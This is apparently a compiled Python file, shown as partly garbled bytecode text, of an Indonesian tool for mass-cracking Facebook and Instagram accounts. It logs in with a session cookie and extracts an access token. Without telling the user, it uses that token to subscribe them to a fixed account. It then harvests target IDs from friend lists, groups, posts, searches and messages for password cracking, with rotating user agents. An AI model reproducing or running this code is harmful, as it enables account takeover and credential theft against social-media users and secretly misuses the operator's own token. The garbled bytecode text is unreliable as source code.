o
    �t<b�� �                   @   s�  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dl	m
Z
 d dlmZ d dl Z d dlZd dlZd dlZd dlZd dlZd dlmZ d dlmZ d dlmZ d dl mZ dZdZg d	�Zd
Zed� dd� Zdd� Zdd� Zdd� Zdd� Zdd� Ze�  d dlZd dl Z d dlZd dlZd dlZzd dlZW n ey�   ed� e �d� Y nw d dlZd dlm Z  d dl!m"Z" zd dlZW n  ey�   dZ#ej$j e#dd�Z%ej&�"� �e%� e �d� Y nw zd dlZ'W n! e�y   dZ(ej$j e(dd�Z)ej&�"� �e)� e �d � Y nw zd dl*Z*W n! e�y:   d!Z+ej$j e+dd�Z,ej&�"� �e,� e �d"� Y nw zd dl-Z-W n! e�yb   d#Z.ej$j e.dd�Z/ej&�"� �e/� e �d$� Y nw zd dl0Z0W n! e�y�   d%Z1ej$j e1dd�Z2ej&�"� �e2� e �d&� Y nw e3e j4d'�Z5ej6g d(�e5ej7d)�Z8e5�9�  e8d k�r�d*Z:ej$j e:dd�Z;ej&�"� �e;� e �d+� d,Z<d-Z=d.Z>d dlZd dl?Z?d dl Z d dlZd dl*Z*d dlZd dlZd dlZd dlZd dlZd dl@Z@d dlZd dlAZAd dlBZBd dlCZCd dlDZDd dlEZEd dl0Z0d dlFZEd dlGZGd dlmZ d d/l*mHZI d d0lJmKZKmLZL d dlmZM d d1l@m@Z@ e@�N� ZOeOjPZQg d2�ZRzeQd k �sHeQd3k�rKeS�  eQd ZTW n eU�y]   eS�  Y nw e@�N� ZVeVjWZXeReT ZYeVjZZ[eVjPZ\d4eXeYe[f Zd5d6d7d8d9d:d;d<d=d>d?d@dA�Z]d,Z^d-Z_dBZ`dCZadDZbdEZcdFZddGZed.Zfe^e_e`eaebecedeegZge�heg�ZidHZjg g g g g d f\akalZmZnaoapejq�rdI� dJdK� ZsdLdM� Zte�udN�jvZwe�udO��� Zxz
exdP ZyexdQ ZzW n e{�y�   dRZydRZzY nw dSdT� Z|i fdUdV�Z}dWdX� Z~G dYdZ� dZ�Zd[d\� Z�d]d^� Z�G d_d`� d`�Z�G dadb� db�Z�dcdd� Z�dedf� Z�dgdh� Z�g aoG didj� dj�Z�g a�g a�g Z�g Z�dkdl� Z�dmdn� Z�dodp� Z�dqdr� Z�i Z�i Z�dsdt� Z�dudv� Z�dwdx� Z�dydz� Z�d{d|� Z�d}d~� Z�e@�N� ��d�ZWd�Z�d�Z�d�Z�d�Z�d�Z�g Z�g a�g a�g a�d apg a�e��� Z�zeEj�Z�W n   eEj�j�Z�Y d�d�� Z�d�d�� Z�d�d� Zd�d�� Z�d�d�� Z�d�dd� Z�G d�d�� d��Z�d�Z�G d�d�� d��Z�da�d�d�� Z�d�d�� Z�d�d�� Z�e�d�k�r�e~�  dS )��    N)�ThreadPoolExecutor)�ConnectionError)�sleep)�randint)�systemzSIA GELOi�� )Z25�03Z2022zZ[0m* Created By Asep-IT Ganz
* Email vakumhacker@gmail.com ( [32mTools Kedaluarsa [0m)
�   c                 C   s:   | d D ]}t j�|� t j��  t�t�� d � qd S )N�
g-C��6?)�sys�stdout�write�flush�timer   �random)ZngacengZpeli� r   �'/storage/emulated/0/haha/haha/backup.py�kontol   s
   
�r   c                  C   s8   g d�} | D ]}t d�| f tj��  t�d� qd S )N)z,   z.. z...u   ..✓z# Sedang Mengirim Pesan r   )�printr
   r   r   r   r   )Ztitik�or   r   r   �tik   s   
�r   c                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )Nr	   g�������?)r
   r   r   r   r   r   )�s�cr   r   r   r   !   s
   
�r   c                  C   s    t j} tj| | gt j�R �  d S �N)r
   �
executable�os�execl�argv)Zngulangr   r   r   �restart(   s   r   c                  C   s�   t �d� ddlm}  | �� }|�d�}|�d�}|�d�}|| | }td td  td  }||krbtd	�d
t d
 g�� td	�dg�� t	d�}t
�  td� t �d| d � t��  d S t�  d S )N�clearr   ��datetime�%d�%m�%Y�   r   r	   � zx* Sctipt Anda Kedaluarsa.. 
* Hubungin Admin Jika Ingin Membeli Tols Lagi

    # [41mGunakan Tanda + Untuk Spasi[0m #
z
# Pesan : z*xdg-open https://wa.me/6285794270820?text=� )r   r   r    �now�strftime�expiredr   �join�pesing�inputr   r   r
   �exitr   )r    �saat_ini�tgl�bln�thn�tanggal�expZmekr   r   r   �login.   s   



8
r4   c                  C   st   ddl m }  | �� }|�d�}|�d�}|�d�}|| | }td td  td  }t|�d t|�kr7d S 	 d S )Nr   r   r!   r"   r#   r$   r   )r    r'   r(   r)   �float)r    r.   r/   r0   r1   r2   r3   r   r   r   r   >   s   


z
	[0m >_< mohon tunggu... >_<
zpip install rich)�Markdown)�Consoleu+   # • sedang menginstall modul requests •�green�Zstylezpip install requestsu*   # • sedang menginstall modul futures •zpip install futuresu&   # • sedang menginstall modul bs4 •zpip install bs4u,   # • sedang menginstall modul mechanize •zpip install mechanizeu,   # • sedang menginstall modul stdiomask •zpip install stdiomask�w)Zdpkgz-sz
play-audio)r   �stderru'   # • sedang menginstall play-audio •zpkg install play-audioz[1;91mz[1;92mz[0m)�BeautifulSoup)�Thread�Eventr   )�Januari�Februari�Maret�April�Mei�Juni�Juli�Agustus�	September�Oktober�November�Desember�   z%s-%s-%sr?   r@   rA   rB   rC   rD   rE   rF   rG   rH   rI   rJ   )�01�02r   �04�05�06�07�08�09�10�11Z12z[1;93mz[1;94mz[1;95mz[1;96mz[1;97mz[38;2;255;127;0;1m�    [0m[[31m•[32m•[0m]u,   [1;35m]2; {×} Cracks by Asepitgans {×} c                 C   s0   | d D ]}t j�|� t j��  td� qd S )Nr	   g���Q��?)r
   r   r   r   �jeda)ZkelilingZmaur   r   r   �jalan�   s   �rX   c                   C   sf   zt �d� W n   Y zt �d� W n   Y zt �d� W n   Y zt �d� W d S    Y d S )N�IG�OK�CP�data)r   �mkdirr   r   r   r   �folder�   s   r^   z#https://unitedcyberteam.com/cek.phpzhttp://ip-api.com/json/ZqueryZcountryr&   c                
   C   sH   t �d� td� tdttttttttf � tdttttt	f � d S )Nr   z�[31m____ ____ ____ ____ _  _ ____ ____ ___  
|    |__/ |__| |    |_/  [__  |___ |__] 
[0m|___ |  \ |  | |___ | \_ ___] |    |__] 
                                        uD    %s[0m[[31m•[33m•[0m]%s[0m IP LU %s:%s [0m%s %s- %s[0m%s u6   %s[0m [[31m•[33m•[0m]%s [0mKujg%s  : %s[0m%s)
r   r   r   �U�O�M�IP�H�CN�kur   r   r   r   �banner�   s   
6rf   c                 C   sL   | � dd��� �d�D ]}|�d�}t|�dkr#|�|d |d i� q|S )Nr&   r%   �;�=r   r   )�replace�strip�split�len�update)�cookieZvenom�x�kukir   r   r   �romz_xyz�   s   
�rq   c               
   C   s8  zt tdd��� �� �} W n� ty�   t�d� t�  tdt	t
ttf � tdt	t
ttf � tdt	t
ttf � 	 tdttttf �}|d	v rRtd
tt
f � nA|dv rZt�  n9|dv rbt�  n1|dv r�tdttf � tdtt
tttf �}|d	v r�tdtt
f � t�  n
t|� t|���  q;w t� ��  d S )N�data/cookies�rr   z*
%s%s%s [32m01 [0m%s[0mLogin instagram z(%s%s%s [32m02 [0m%s[0mLogin Facebook z %s%s%s [12m00[0m %s[0mKeluar Tu1   
%s [0m[[31m•[33m•[0m]%s [0mPilih %s> %sr%   �%s%s [0misi yang benar ��1rL   ��0Z00��2rM   uR   
%s[0m [[31m•[33m•[0m]%s [0mWajib gunakan akun tumbal dilarang akun utamaz%s%s %s[0mCookie %s> %sz%s%s[0m[0m isi cookie kentod )rq   �open�readrj   �FileNotFoundErrorr   r   rf   r   r_   �til�Kr`   ra   r,   �P�checkinr-   rX   �	konverter�masukr4   �pilihan�menu)�kueh�rom�kukisr   r   r   �Masuk�   s6   
��r�   c                   @   �   e Zd Zdd� Zdd� ZdS )r�   c                 C   s   || _ d| _d S �N�https://mbasic.facebook.com)�cok�url)�selfr�   r   r   r   �__init__  �   
zmasuk.__init__c                 C   s�  z�t j| j� d�t| j�d�j}d|v r�ddlm}m} t	dd��
| j� d|v rh|�t| j�| j�}|�t| j�|���  |��  td	t�d
|�d  d � td� tdttf � td� t� ��  W d S |�t| j�| j�}|�t| j�� |�t| j�|���  tdttf � td� t� ��  W d S d|v r�tdttf � td� W d S tdttf � td� W d S  t jjy�   tdttf � td� Y d S w )Nz/profile.php?v=info��cookies�mbasic_logout_buttonr   )r4   �	informasirr   r:   zLaporkan Masalahu+   

 [0m[[31m•[32m•[0m] Hai, Welcome �\<title\>(.*?)<\/title\>z
 Ngentod:vr$   u   %s%s login Berhasil √u   
%s%s login Berhasil √�
checkpointu   %s%s × login checkpoint u   %s%s × cookie invalid z%s%s tidak ada koneksi )�requests�getr�   rq   r�   �textr\   r4   r�   r{   r   Zbot�info�myinfoZusernemr   �re�findallrW   rc   r~   r�   r�   Zlangr-   ra   �
exceptionsr   )r�   �cekr4   r�   Zmikeyr   r   r   r4     s.   $�zmasuk.loginN)�__name__�
__module__�__qualname__r�   r4   r   r   r   r   r�     s    r�   c                 C   s�   dddddddd| d	�	}z@t jd
|d�}t�d|j�}|�d�}d|v rJtdd��|� tdt	� dt
� dt� dt� |� d�
� td� t|� W d S W d S  tya   tdttf � t�  Y d S  tyu   tdttf � t�  Y d S w )Nzbusiness.facebook.com�	max-age=0rv   z�Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36zUtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8ztext/html; charset=utf-8�gzip, deflatez#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7)	�Host�cache-control�upgrade-insecure-requests�
user-agent�accept�content-type�accept-encoding�accept-languagern   z0https://business.facebook.com/business_locations��headersz	(EAAG\w+)r   ZEAAG�data/token.txtr:   r	   rV   z [0mToken anda �> r&   r$   z9%s%s terjadi kesalahan saat convert, periksa cookie anda )r�   r�   r�   �searchr�   �groupr{   r   r   r�   r`   ra   r   rW   �	login_bot�AttributeErrorr~   r-   �UnboundLocalError)r�   Z_headerZlingZcari�romzr   r   r   r�   "  s4   �
.��r�   c                 C   s2   z| }d}t �d|� d|� �� W d S    Y d S )NZ100024568410033�https://graph.facebook.com/z!?fields=subscribers&access_token=)r�   �post)r�   ZtoketZromz1r   r   r   r�   >  s   r�   c                   @   r�   )�Menuc                 C   s
   || _ d S r   )r�   )r�   r�   r   r   r   r�   J  s   
zMenu.__init__c              
   C   s0  zt tdd��� �� �}W n ty,   t�d� tdtt	f � t
d� t�d� Y nw zt�tdd��� �� �}W n" ty]   dd	lm} |�|tjd
|d�j���  t�d� Y nw ztj| j� d�|d�j}W n tjjy�   tdtt	tf � Y nw d|vr�t�d� tdtt	f � t
d� t�d� d S t�  tdt� d|�d�� d�� tdttf � tdttf � tdttf � tdttf � tdttf � tdttf � tdttf � tdttf � tdttf � tdttf � tdttf � tdttf � tdttf � d S ) Nrr   rs   �?rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info�%s%s cookie invalid r$   �python bff-2.py�data/my_infor   )r�   z.https://mbasic.facebook.com/profile.php?v=infor�   z/profile.phpz

%s%s[0m tidak ada koneksi%s
r�   u     [0m[[31m•[33m•[0m] Namez  : [0m�namaz	 Ngentod
uQ   %s [0m[[31m•[33m•[0m] [32m01[0m %s[0mCrack facebook dari daftar teman uR   %s [0m[[31m•[33m•[0m] [32m02[0m %s[0mCrack facebook dari total pengikutuQ   %s [0m[[31m•[33m•[0m] [32m03[0m %s[0mCrack facebook dari reaction postuQ   %s [0m[[31m•[33m•[0m] [32m04[0m %s[0mCrack facebook dari komentar postuQ   %s [0m[[31m•[33m•[0m] [32m05[0m %s[0mCrack facebook dari anggota groupuR   %s [0m[[31m•[33m•[0m] [32m06[0m %s[0mCrack facebook dari pencarian namauS   %s [0m[[31m•[33m•[0m] [32m07[0m %s[0mCrack facebook dari pesan mesenggeruO   %s [0m[[31m•[33m•[0m] [32m08[0m %s[0mCrack facebook dari saran temanuT   %s [0m[[31m•[33m•[0m] [32m09[0m %s[0mCrack instagram Login ([32mNew[0m)uJ   %s [0m[[31m•[33m•[0m] [32m10[0m %s[0mLihat hasil crack facebookuL   %s [0m[[31m•[33m•[0m] [32m11[0m %s[0mCheckpoint facebook detektoruI   %s [0m[[31m•[33m•[0m] [32mrm[0m %s[0mHapus data login facebooku@   %s [0m[[31m•[33m•[0m] [32m00[31m %s[0mKeluar (logout))rq   r{   r|   rj   �IOErrorr   r   r   ra   r~   rW   �json�loadsr}   r\   r�   r�   r�   r�   r�   r�   r�   r�   r   r-   �Nrf   r�   r`   )r�   r�   �tentangr�   �ar   r   r   r�   M  sL   
���
zMenu.tentangN)r�   r�   r�   r�   r�   r   r   r   r   r�   H  s    r�   c                   @   sd   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� Zdd� Zdd� Z	dd� Z
dd� Zdd� Zdd� ZdS )r�   c                 C   s�   t tdd��� �� �| _z
tdd��� | _W n$ ty:   t�d� t�d� t	dt
tf � td� t�d� Y nw d	| _g | _d S )
Nrr   rs   r�   r�   r   r�   r$   r�   r�   )rq   r{   r|   rj   r�   �tokenr}   r   r   r   ra   r~   rW   r�   �id�r�   r   r   r   r�   v  s   

�
zpilihan.__init__c              	   C   s�  t | j���  tdttttf �}|dv r'tdtt	f � t
d� | ��  �n�|dv r�tdtt	tttf �}|dv rHtdtt	f � t
d� �q�|dv rjz| j}| �|� W �q� tyi   td	tt	f � Y �q�w |d
v r�tdtt	tf � tdtt	tttf �}|dv r�tdtt	f � t
d� �q�t�d|�r�t�d| �j}zt�dt|��d }W n   |}Y ztd� | j}| �||� W �q� ty�   td	tt	f � Y �q�w �n�|dv �r}tdtt	tf � tdtt	tttf �}|dv �rtdtt	f � t
d� n	| j� d|� d�}zXtj|| jd�j}d|v �r&tdtt	f � n>d|v �r4tdtt	f � n0d|v �rBtdtt	f � n"tt� t	� t� dt� dt� d�t�d |�d  � td� | �|� W �q� tjj�y|   td!tt	tf � Y �q�w |d"v �rVtd#tt	tf � td$tt	tttf �}|dv �r�tdtt	f � t
d� | ��  n&d%|v �r�|�d%d&�}nd'|v �r�|�d'd&�}nd(|v �r�|�d(d&�}n|}zXtj|| jd�j}	d)|	v �r�td*tt	f � n>d|	v �r�tdtt	f � n0ztd� t�d+|	�d �d,d-�}
| �| j� d.|
� �� W n t�y'   td/tt	f � Y nw W �q� tjj�y@   td!tt	tf � Y �q� tjj �yU   td0tt	tf � Y �q�w |d1v �r#td#tt	tf � td$tt	tttf �}|dv �r�tdtt	f � t
d� | ��  n&d%|v �r�|�d%d&�}nd'|v �r�|�d'd&�}nd(|v �r�|�d(d&�}n|}zLtj|| jd�j}	d)|	v �r�td*tt	f � n2d|	v �r�tdtt	f � n$ztd� | �!| j� d|� �� W n t�y�   td/tt	f � Y nw W �q� tjj�y   td!tt	tf � Y �q� tjj �y"   td0tt	tf � Y �q�w |d2v �r�	 td4tt	tf � td5tt	tttf �}|dv �rOtdtt	f � t
d� n�zjtj| j� d6|� �| jd�j}d7|v �rmtd8tt	f � nKd|v �r{tdtt	f � n=d|v �r�td8tt	f � n/tt� t	� t� d9t� dt� d�t�d |�d d:d �  � td� | �"| j� d6|� �� W �q�W n tjj�y�   td!tt	tf � Y nw �q)�n�|d;v �r�	 td<tt	tf � td=tt	tttf �}|dv �r�tdtt	f � t
d� n�zetj| j� d>|� �| jd�j}d?|v �rtd@tt	f � nFd|v �r+tdtt	f � n8t#tdAtt	tttf ��}dBt|�v �rC|dC8 }|dDk �r[td� | �$| j� d>|� �|� W �q�tdEtt	f � W n* tjj�yy   td!tt	tf � Y n t%�y�   tdtt	f � t
d� Y nw �qِn1|dFv �r�td� | �&dG� �n!|dHv �r5z`tj| j� dI�| jd�j}dJ|v �r�tdKtt	f � nBd|v �r�tdtt	f � n4td� t#tdLtt	tttf ��}dBt|�v �r�|dC8 }|dDk �r�| �'| j� dI�|� ntdEtt	f � W �q� tjj�y   td!tt	tf � Y �q� t%�y4   tdtt	f � t
d� Y �q�w |dMv �r>t(�  n�|dNv �r{tdOtt	ttf � tdPtt	ttf � tdQtt	ttf � tdRtt	ttf � tdStt	tttf �}t)|� nI|dTv �r�t*�  n@|dUv �r�tdVtt	f � t
dC� zt+�,dW� t+�,dX� t+�,dY� W n	   t+�-dZ� Y t.d[t/t	f � t�  n|d\v �r�t�  t0| j1�dk�r�t t2� �3| j1�S d S )]Nu-   
%s [[31m•[33m•[0m] %s[0mPilih %s> %s)r%   r&   z
%s%s isi yang benarr$   ru   z3
%s%s%s [0mingin dump id secara massal? y/t%s >%s �r%   ��y�Yz
%s%s gagal mengambil id ��t�Tz?
%s%s %s[0mKetik [ me ] Pastikan daftar teman bersifat publik z%s%s %s[0mUsername/Id%s > %s�\w+�https://mbasic.facebook.com/�\;rid\=(\d+)\&r   r%   ry   z?
%s%s %s[0mKetik [ me ] Pastikan target terdapat pengikut nya �
%s%s [0misi yang benar�/z?v=followersr�   z/Anda Tidak Dapat Menggunakan Fitur Ini Sekarangz/
%s%s akun terkena spam coba beberapa saat lagiz(Halaman yang Anda minta tidak ditemukan.z
%s%s Id tidak ditemukan zKonten Tidak Ditemukanz [0mNama akun �>r&   r�   z

%s%s tidak ada koneksi%s
��3r   z=
%s%s %s[0mPastikan postingan bersifat publik tidak private z$%s%s %s[0mUrl/link postingan %s> %s�m.facebook.com�mbasic.facebook.comzwww.facebook.com�free.facebook.comz5Halaman yang diminta tidak bisa ditampilkan sekarang.z 
%s%s postingan tidak di temukanz5\<a\ href\="\/ufi\/reaction\/profile\/browser\/(.*?)"rg   �&z/ufi/reaction/profile/browser/z'
%s%s masukan id postingan dengan benarz
%s%s Invalid url%s
��4rN   ��5rO   Tz9
%s%s %s[0mPastikan group bersifat publik tidak private z%s%s %s[0mId group %s> %sz/browse/group/members/?id=zHalaman Tidak Ditemukanz
%s%s group tidak di temukanz [0mNama group �   ��6rP   z2
%s%s %s[0mMasukan nama orang contoh Asepitgans  z%s%s %s[0mMasukan nama %s> %sz/search/people/?q=zMaaf, kami tidak menemukanz
%s%s nama tidak di temukanz%s%s %s[0mJumlah nama  %s> %sZ6000r   iq  z
%s%s Max 6000 user��7rQ   z$https://mbasic.facebook.com/messages)�8rR   z/friends/center/suggestionszTidak Ada Saranz
%s%s tidak ada saran temanz%s%s %s[0mJumlah teman %s> %s)�9rS   )rT   z)
%s%s%s 01 %s[0mCek hasil akun facebook z)%s%s%s 02 %s[0mCek hasil akun instagram z"%s%s%s 03 %s[0mHapus hasil crack �%s%s%s 00 %s[0mKembali z
%s%s %s[0mPilih %s> %s)rU   )�RM�Rm�rmz+
%s%s [0mmenghapus data login dari termux rr   r�   r�   z>rm -rf data/cookie && rm -rf data/token && rm -rf data/my_infoz
%s%s [0mberhasil terhapus rw   )4r�   r�   r�   r,   r�   r`   ra   r   r   r~   rW   r�   r_   r�   �MassalGRAPH�KeyErrorr-   r�   r�   r�   r�   r�   �str�PublikGRAPHr�   �FollowersPARr�   r   r�   ri   �	postingan�
IndexErrorZMissingSchema�komen�grup�intr�   �
ValueError�pesan�saranr�   �cek_cek�file_cpr   �remover   rX   rc   rl   r�   �Crack�romiy)r�   ZslutZganr�   �idtrs   �user�data_�response�responr�   Zjumlahr�   r   r   r   r�   �  s�  ���




2
��







���







���




:���




���




��







�zpilihan.menuc           	      C   s`  zt tdtttttf ��}tdtttf � W n   d}Y t|�D ]`}|d7 }tdtttt	|ttf �}|dv r=t n!t
�d|�r^t�d| �j}zt
�dt|��d	 }W n   |}Y t�d
|� d|� ���� }|d d D ]}| j�|d � d|d � �� qqq#z%td� tdt� t� t� dt� dt� dt� t| j�� t� d�dd� W d S    Y d S )N�%s%s %s[0mJumlah target%s > %sz2
%s%s %s[0mPastikan daftar teman bersifat publik r   z"%s%s %s[0mUsername/Id %s%s%s > %sr�   r�   r�   r�   r   r�   z2?fields=name,friends.fields(id,name)&access_token=�friendsr\   r�   �<=>�namer%   �z [0m[0mMengumpulkan Id r�   �[�] ��end)r�   r,   r_   r~   r`   ra   r   r   �ranger�   r�   r�   r�   r�   r�   r�   r�   r�   �appendrc   rl   )	r�   r�   �jumr�   r�   rs   r�   �po�ir   r   r   r�   \  s0    �Bzpilihan.MassalGRAPHc                 C   s�   zFt �d|� d|� ���� }|d d D ]/}| j�|d � d|d � �� tdt� t� t� d	t	� d
t� dt
� t| j�� t� d�dd� qW d S    Y d S )Nr�   z>?fields=name,friends.fields(id,name).limit(5000)&access_token=r  r\   r�   r  r  r  � [0mMengumpulkan Id r�   r  r  r%   r	  )r�   r�   r�   r�   r  r   r_   r~   r`   ra   rc   rl   )r�   r�   r�   r  r  r   r   r   r�   w  s   >�zpilihan.PublikGRAPHc                 C   sj  z�t j|| jd�j}t�d|�}|D ]}d|d v r/| j�t�d|d �d d |d  � nDd|d v rJ| j�t�d	|d �d d |d  � n)d
|d v re| j�t�d|d �d d |d  � n| j�|d d |d  � tdt	� t
� t� dt� dt	� dt� t| j�� t	� d�dd� qd|v r�| �| jt|d�jddd��d� � W d S W d S    Y d S )Nr�   zE" \/>\<div\ class\=".."\>\<a\ href\="\/(.*?)"\><span\>(.*?)\<\/span\>z&amp;refid=r   z	id=(.*?)&r  r   �profile.php?�id=(.*)z?refid=�(.*?)\?refid=r  r  r�   r  r  r%   r	  �Lihat Selengkapnya�html.parserr�   �Zstring�href)r�   r�   r�   r�   r�   r�   r�   r  r   r_   r~   r`   ra   rc   rl   r�   r�   �parser�find�r�   r�   r  �otwr  r   r   r   r�   �  s"   ***>,�zpilihan.FollowersPARc                 C   s(  z�t j|| jd�j}d|v rtdttf � W d S t�d|�}|D ]O}d|d v r>| j	�
t�d|d �d d |d	  � n| j	�
t�d
|d �d d |d	  � tdt� t� t� dt� dt� dt� t| j	�� t� d�dd� q!d|v r�| �| jt|d�jddd��d� � W d S W d S    Y d S )Nr�   zSemua 0z'
%s%s tidak ada yg menanggapi postinganz2\<h3\ class\=".."\>\<a\ href\="(.*?)"\>(.*?)<\/a\>r  r   r  r  r   z/(.*)r  r  r�   r  r  r%   r	  r  r  r�   r  r  )r�   r�   r�   r�   r-   ra   r~   r�   r�   r�   r  r   r_   r`   rc   rl   r�   r�   r  r  r  r   r   r   r�   �  s   *(>,�zpilihan.postinganc           	      C   sJ  z�t j|| jd�j}t|d�}|�d�D ]n}|jddd�D ]d}d|�d�v rE|�d��d	�d
 }|�d�d }|j}| j�|d | � n|�d��d�d }|�d�d
 }|j}| j�|d | � t	dt
� t� t� dt� dt
� dt� t| j�� t
� d�dd� qq|jddd�D ]}d|jv r�| �d|�d� � q�W d S    Y d S )Nr�   r  �h3r�   T�r  �profile.phpr  rh   r   r�   r   r  �?r�   r  r  r�   r  r  r%   r	  u   Lihat komentar lainnya…r�   )r�   r�   r�   r�   r  �find_allrk   r�   r  r   r_   r~   r`   ra   rc   rl   r�   )	r�   r�   r  r  r  r�   r   r�   r�   r   r   r   r�   �  s.   
>�
��zpilihan.komenc                    s.  z�t j|� jd�j}t�d|�}|D ]I}d|d v r/� j�t�d|d �d d |d  � n� j�|d d |d  � tdt	� t
� t� d	t� d
t	� dt� t� j�� t	� d�dd� qd|v rv� �� jt|d�jddd��d� � W d S � �fdd���� j� d�t�d|��d� � W d S    Y d S )Nr�   z4\<h3\>\<a\ class\=".."\ href\="\/(.*?)"\>(.*?)<\/a\>r  r   r  r  r   r  r  r�   r  r  r%   r	  r  r  r�   r  r  c                    s$  t j| td�j}t�d|�}t|�dkrx|D ]a}d|d v r<t�d|d ��d�}|� j	v r/q� j	�
|d |d  � nt�d|d ��d�}|� j	v rMq� j	�
|d |d  � td	t� t� t� d
t� dt� dt� t� j	�� t� d�dd� qd|v r��� jt|d�jddd��d� � d S d S )Nr�   zL\<h3\ class\=".*?">\<span>\<strong>\<a\ href\="/(.*?)">(.*?)</a\>\</strong\>r   r  zprofile.php\?id=(\d*)r   r  z(.*?)\?refidr  r  r�   r  r  r%   r	  zLihat Postingan Lainnyar  r�   r  r  )r�   r�   r�   r�   r�   r�   rl   r�   r�   r�   r  r   r_   r~   r`   ra   rc   r�   r  r  )Zgcr�   �br   �d�r�   �tambahr   r   r$  �  s"   

>(�zpilihan.grup.<locals>.tambahz/groups/zid=(\d*))r�   r�   r�   r�   r�   r�   r�   r  r   r_   r~   r`   ra   rc   rl   r�   r�   r  r  r�   r�   r  r   r#  r   r�   �  s   *>,(zpilihan.grupc                 C   s.  z�d}t j|| jd�j}t�d|�}|D ]Z}d|d v r1| j�t�d|d �d d |d	  � n| j�t�d
|d �d d |d	  � tdt	� t
� t� dt� dt	� dt� t| j�� t	� d�dd� t| j�|krnd} qoq|dkr�d|v r�| �t|d�jddd��d�|� W d S W d S W d S    Y d S )NFr�   z{picture" \/>\<\/a\>\<\/td\>\<td\ class\="(.*?)"\>\<a\ href\="\/(.*?)"\>\<div\ class\=".."\>\<div\ class\=".."\>(.*?)<\/div>r  r   zid=(.*?)&amp;refidr   r  r$   r  r  r  r�   r  r  r%   r	  TzLihat Hasil Selanjutnyar  r�   r  r  )r�   r�   r�   r�   r�   r�   r�   r  r   r_   r~   r`   ra   rc   rl   r�   r  r  �r�   r�   r  �truer  r  r  r   r   r   r�   �  s(   *(<�(�zpilihan.namac                 C   s0  z�t tj|| jd�jd�}tdt� t� t� dt	� dt� dt
� t| j�� t� d�dd	� |jd
dd�D ]\}d|�d�v rtj�d|�d��}z't|�� �D ]}| j�d�|v rWqLd|j�� v r_qL| j�|d |j � qLW n ty~ } zW Y d }~q2d }~ww d|jv r�| �d|�d� � q2W d S    Y d S )Nr�   r  r  r  r�   r  r  r%   r	  r�   Tr  z/messages/readr  zcid\.c\.(.*?)%3A(.*?)&z c_userzpengguna facebookr  zLihat Pesan Sebelumnyar�   )r  r�   r�   r�   r�   r   r_   r~   r`   ra   rc   rl   r�   r   �bs4r�   r�   �list�pop�lowerr  �	Exceptionr�   )r�   r�   Zbsr  �fZip�er   r   r   r�   �  s0   <���
��zpilihan.pesanc                 C   s�   zxd}t j|| jd�j}t�d|�}t|�dkrT|D ]9}| j�|d d |d  � t	dt
� t� t� dt� d	t
� d
t� t| j�� t
� d�dd� t| j�|krSd} qTq|dkrsd|v rv| �| jt|d�jddd��d� |� W d S W d S W d S    Y d S )NFr�   zN\<a\ class\=".."\ href\="/friends/hovercard/mbasic/\?uid=(\d*).*?"\>(.*?)</a\>r   r  r   r  r  r�   r  r  r%   r	  TzLihat selengkapnyar  r�   r  r  )r�   r�   r�   r�   r�   r�   rl   r�   r  r   r_   r~   r`   ra   rc   r�   r�   r  r  r%  r   r   r   r�     s&   <�.�zpilihan.saranN)r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r   r   r   r   r�   t  s     [
&r�   c                  C   s   g d�} t �| �}|S )N)��Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36zyMozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12zrMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36��Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)z{NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+zgNokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)��Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2z�Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]z�Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 